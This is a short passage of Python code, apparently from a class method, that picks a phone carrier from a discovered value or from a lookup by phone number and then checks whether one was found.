                    or self._discovered.get("carrier")
                    or carrier_from_phone(phone))
         if not carrier:
